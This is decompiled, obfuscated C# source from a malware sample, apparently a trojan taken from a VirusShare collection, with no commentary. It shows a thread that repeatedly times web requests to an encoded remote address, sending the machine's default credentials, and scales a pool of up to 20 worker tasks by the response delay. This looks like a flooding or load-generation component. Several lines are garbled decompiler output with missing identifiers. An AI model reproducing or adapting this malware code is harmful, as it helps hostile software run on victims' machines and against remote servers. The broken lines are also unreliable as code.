// Decompiled with JetBrains decompiler
// Type: *p.A
.t.
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0016t;
using System;
using System.IO;
using System.Net;
using System.Threading;

namespace \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0016t
{
  internal class \u0001\u0011 : \u005E\u0025\u0002N\u007D\u0003e
  {
    private static bool \u0039\u0003\u0021\u003C\u000C\u0006\u0016 = false;
    private static long \u0021\u001Bx\u0008\u0025\u00044 = \u0001\u0011.\u001D\u007D();
    private static Thread Pp\u002B\u0007S\u001D\u001FR = new Thread(new ThreadStart(\u0001\u0011.Q\u0019\u0008N\u0006));

    public static void \u003C\u001C\u003D\u001BL(
      \u0001\u0011.\u002F\u0018\u0005 _param0,
      string[] _param1)
    {
      if (!\u005E\u0025\u0002N\u007D\u0003e.\u0018\u007D\u0024\u0025D\u0015\u000F\u0085(_param0, _param1))
        return;
      \u0001\u0011.\u0039\u0003\u0021\u003C\u000C\u0006\u0016 = true;
      \u0001\u0011.Pp\u002B\u0007S\u001D\u001FR.Start();
    }

    public static void \u0019\u0008J\u0002\u0009\u0016()
    {
      \u0001\u0011.\u0039\u0003\u0021\u003C\u000C\u0006\u0016 = false;
      for (int index = 0; index < \u005E\u0025\u0002N\u007D\u0003e..Count; ++index)
      {
        \u005E\u0025\u0002N\u007D\u0003e.[index].CancelAsync();
        \u005E\u0025\u0002N\u007D\u0003e..RemoveAt(index);
      }
    }

    private static void Q\u0019\u0008N\u0006()
    {
      while (\u0001\u0011.\u0039\u0003\u0021\u003C\u000C\u0006\u0016)
      {
        long num = \u0001\u0011.\u0011\u002C();
        if (num != -1L)
        {
          if (num - \u0001\u0011.\u0021\u001Bx\u0008\u0025\u00044 > 20L)
          {
            if (\u005E\u0025\u0002N\u007D\u0003e..Count > 1)
              \u005E\u0025\u0002N\u007D\u0003e.\u000E\u0007\u008E\u00169();
          }
          else if (\u005E\u0025\u0002N\u007D\u0003e..Count < 20)
            \u005E\u0025\u0002N\u007D\u0003e.U\u0024J\u001F\u0022\u001E\u0020();
          Thread.Sleep(5000);
        }
      }
    }

    private static long \u001D\u007D()
    {
      long num = 0;
      for (int index = 0; index < 11; ++index)
      {
        num += \u0001\u0011.\u0011\u002C();
        Thread.Sleep(100);
      }
      return num / 14L;
    }

    private static long \u0011\u002C()
    {
      ServicePointManager.Expect100Continue = false;
      WebRequest webRequest = WebRequest.Create(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001B\u005C\u002B6\u000B\u0015\u000F());
      webRequest.Method = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0022\u007C();
      webRequest.Proxy = (IWebProxy) null;
      webRequest.Credentials = CredentialCache.DefaultCredentials;
      TimeSpan timeSpan = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
      using (HttpWebResponse response = (HttpWebResponse) webRequest.GetResponse())
      {
        if (response.StatusDescription != \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u007C\u002B\u0040\u001F\u0019\u0028())
          return -1;
        new StreamReader(response.GetResponseStream()).ReadToEnd();
        response.Close();
      }
      return Convert.ToInt64((DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc) - timeSpan).TotalMilliseconds);
    }

    public enum \u002F\u0018\u0005
    {
      \u003F\u0004\u003Ek,
      \u0018\u000B,
      \u001C\u0012\u003B\u000C\u0017,
    }
  }
}
